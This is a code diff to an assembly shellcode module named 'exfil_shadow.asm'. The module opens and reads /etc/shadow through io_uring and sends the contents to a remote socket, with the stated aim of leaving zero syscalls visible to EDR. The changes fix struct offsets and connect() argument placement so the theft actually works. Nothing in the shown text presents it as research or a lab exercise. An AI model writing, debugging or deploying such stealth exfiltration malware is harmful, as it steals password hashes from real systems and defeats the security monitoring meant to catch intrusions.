@@ -1,6 +1,10 @@
 ; ================================================================
 ; missions/exfil_shadow.asm — Layer 2: exfiltrate /etc/shadow
 ; ================================================================
+; Reference source only — not assembled by the Makefile (it references
+; the Layer 0/1 labels of combined/shellcode.asm). The builder renders
+; the equivalent ops from the same base at build time.
+; ================================================================
 ; Sequence (all via io_uring, visible EDR syscall count = 0):
 ;   1. IORING_OP_OPENAT  — open /etc/shadow
 ;   2. IORING_OP_READ    — read up to 4096 bytes
@@ -40,7 +44,7 @@
 %define SQ_ADDR     16  ; u64 addr (buffer or path pointer)
 %define SQ_LEN      24  ; u32 len
 %define SQ_OPFLAGS  28  ; u32 op-specific flags (open_flags for OPENAT)
-%define SQ_UDATA    40  ; u64 user_data
+%define SQ_UDATA    32  ; u64 user_data — +32 (NOT +40, which is buf_index)
 
 ; ----------------------------------------------------------------
 ; Mission entry point
@@ -120,7 +124,12 @@ _mission:
     mov [rax + SQ_FD], ecx
     lea rcx, [r13 + F_SADDR]
     mov [rax + SQ_ADDR], rcx       ; &sockaddr_in
-    mov dword [rax + SQ_LEN], 16   ; sizeof(sockaddr_in)
+    ; CONNECT: addrlen goes in sqe->addr2 (SQ_OFF +8), NOT sqe->len (+24)
+    ; Kernel io_connect_prep: if (sqe->len || ...) return -EINVAL
+    push 0x10
+    pop rcx
+    mov [rax + SQ_OFF], rcx        ; addr2 = sizeof(sockaddr_in) = 16
+    ; SQ_LEN stays 0 (zeroed by _get_sqe)
     mov qword [rax + SQ_UDATA], 4
     call _io_enter
     call _wait_cqe             ; ecx = 0 on success or -errno
